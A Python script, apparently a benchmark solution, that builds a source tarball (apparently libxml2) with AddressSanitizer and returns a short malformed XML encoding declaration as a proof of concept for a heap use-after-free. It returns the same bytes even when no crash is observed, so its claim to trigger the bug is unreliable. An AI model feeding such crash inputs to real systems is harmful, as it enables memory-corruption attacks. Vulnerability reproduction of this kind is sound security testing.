import os
import tarfile
import tempfile
import subprocess

class Solution:
    def solve(self, src_path: str) -> bytes:
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract the source tarball
            with tarfile.open(src_path, 'r:gz') as tar:
                tar.extractall(tmpdir)
            
            # Find the root directory (usually one level deep)
            extracted_dirs = [d for d in os.listdir(tmpdir) if os.path.isdir(os.path.join(tmpdir, d))]
            if not extracted_dirs:
                root_dir = tmpdir
            else:
                root_dir = os.path.join(tmpdir, extracted_dirs[0])
            
            # Build the vulnerable program
            build_dir = os.path.join(root_dir, 'build')
            os.makedirs(build_dir, exist_ok=True)
            
            # Configure with address sanitizer
            configure_cmd = [
                os.path.join(root_dir, 'configure'),
                'CFLAGS=-fsanitize=address -fno-omit-frame-pointer',
                'LDFLAGS=-fsanitize=address',
                '--disable-shared',
                '--prefix=/tmp/install'
            ]
            
            subprocess.run(configure_cmd, cwd=build_dir, capture_output=True)
            subprocess.run(['make', '-j8'], cwd=build_dir, capture_output=True)
            
            # Find xmlIO test programs
            test_programs = []
            for root, dirs, files in os.walk(build_dir):
                for file in files:
                    if file.startswith('test') and 'io' in file.lower() and os.access(os.path.join(root, file), os.X_OK):
                        test_programs.append(os.path.join(root, file))
            
            # Try to trigger the vulnerability with minimal input
            # Based on the vulnerability description, we need to trigger
            # an error in xmlAllocOutputBuffer with encoding handler
            poc = b'<?xml encoding="\xff\xff"?>'
            
            # Test the poc
            for prog in test_programs[:3]:  # Try first few test programs
                try:
                    result = subprocess.run(
                        [prog],
                        input=poc,
                        capture_output=True,
                        timeout=2
                    )
                    # Check for ASAN error
                    if result.returncode != 0 and b'heap-use-after-free' in (result.stderr + result.stdout):
                        return poc
                except:
                    continue
            
            # If no test program found or didn't trigger, return minimal PoC
            # based on vulnerability analysis: encoding handler not freed in error cases
            # Try to create encoding error with invalid UTF-8 sequence
            return b'<?xml encoding="\xff\xff"?>'
